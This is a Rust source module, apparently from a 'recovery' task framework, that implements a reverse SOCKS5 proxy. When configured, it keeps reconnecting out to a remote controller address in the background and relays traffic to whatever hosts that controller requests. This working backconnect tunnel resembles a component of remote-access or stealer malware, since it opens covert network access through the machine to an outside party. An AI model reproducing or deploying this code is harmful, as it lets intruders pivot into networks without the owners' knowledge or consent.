use crate::recovery::context::RecoveryContext;
use crate::recovery::settings::RecoveryControl;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use std::net::IpAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tracing::{debug, info, warn};

pub struct ReverseProxyTask;

#[async_trait]
impl RecoveryTask for ReverseProxyTask {
    fn label(&self) -> String {
        "Reverse SOCKS5 Proxy".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let control = RecoveryControl::global();
        let Some(server_addr) = control.proxy_server() else {
            return Ok(Vec::new());
        };

        if server_addr.trim().is_empty() {
            return Ok(Vec::new());
        }

        let server_addr = server_addr.to_string();
        info!("spawning reverse proxy task connecting to {}", server_addr);

        tokio::spawn(async move {
            run_reverse_proxy_loop(&server_addr).await;
        });

        Ok(Vec::new())
    }
}

async fn run_reverse_proxy_loop(server_addr: &str) {
    let mut failures = 0;
    loop {
        match TcpStream::connect(server_addr).await {
            Ok(stream) => {
                failures = 0;
                debug!("connected to proxy controller, awaiting handshake");
                tokio::spawn(async move {
                    if let Err(e) = handle_socks5_server(stream).await {
                        debug!("proxy connection closed: {}", e);
                    }
                });

                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }
            Err(e) => {
                failures += 1;
                if failures % 10 == 1 {
                    warn!("failed to connect to proxy controller: {}", e);
                }
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            }
        }
    }
}

async fn handle_socks5_server(mut stream: TcpStream) -> std::io::Result<()> {
    let mut buf = [0u8; 2];
    stream.read_exact(&mut buf).await?;

    if buf[0] != 0x05 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "invalid socks version",
        ));
    }

    let nmethods = buf[1] as usize;
    let mut methods = vec![0u8; nmethods];
    stream.read_exact(&mut methods).await?;

    if !methods.contains(&0x00) {
        stream.write_all(&[0x05, 0xFF]).await?;
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "no supported auth method",
        ));
    }

    stream.write_all(&[0x05, 0x00]).await?;

    let mut head = [0u8; 4];
    stream.read_exact(&mut head).await?;

    if head[0] != 0x05 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "invalid socks version in request",
        ));
    }

    let cmd = head[1];
    if cmd != 0x01 {
        reply_error(&mut stream, 0x07).await?;
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "unsupported command",
        ));
    }

    let atyp = head[3];
    let addr_str = match atyp {
        0x01 => {
            // IPv4
            let mut addr_bytes = [0u8; 4];
            stream.read_exact(&mut addr_bytes).await?;
            let ip = IpAddr::V4(std::net::Ipv4Addr::from(addr_bytes));
            ip.to_string()
        }
        0x03 => {
            // Domain
            let mut len_byte = [0u8; 1];
            stream.read_exact(&mut len_byte).await?;
            let len = len_byte[0] as usize;
            let mut domain_bytes = vec![0u8; len];
            stream.read_exact(&mut domain_bytes).await?;
            String::from_utf8_lossy(&domain_bytes).to_string()
        }
        0x04 => {
            // IPv6
            let mut addr_bytes = [0u8; 16];
            stream.read_exact(&mut addr_bytes).await?;
            let ip = IpAddr::V6(std::net::Ipv6Addr::from(addr_bytes));
            ip.to_string()
        }
        _ => {
            reply_error(&mut stream, 0x08).await?;
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "invalid address type",
            ));
        }
    };

    let mut port_bytes = [0u8; 2];
    stream.read_exact(&mut port_bytes).await?;
    let port = u16::from_be_bytes(port_bytes);

    let target_addr = format!("{}:{}", addr_str, port);
    debug!("proxy connecting to target: {}", target_addr);

    match TcpStream::connect(&target_addr).await {
        Ok(mut target) => {
            // BND.ADDR and BND.PORT
            stream
                .write_all(&[0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
                .await?;

            let (mut ri, mut wi) = stream.split();
            let (mut ro, mut wo) = target.split();

            let client_to_target = tokio::io::copy(&mut ri, &mut wo);
            let target_to_client = tokio::io::copy(&mut ro, &mut wi);

            tokio::select! {
                _ = client_to_target => {},
                _ = target_to_client => {},
            }
            Ok(())
        }
        Err(e) => {
            warn!("failed to connect to target {}: {}", target_addr, e);
            reply_error(&mut stream, 0x04).await?;
            Err(e)
        }
    }
}

async fn reply_error(stream: &mut TcpStream, code: u8) -> std::io::Result<()> {
    // VER REP RSV ATYP BND.ADDR BND.PORT
    stream
        .write_all(&[0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
        .await
}
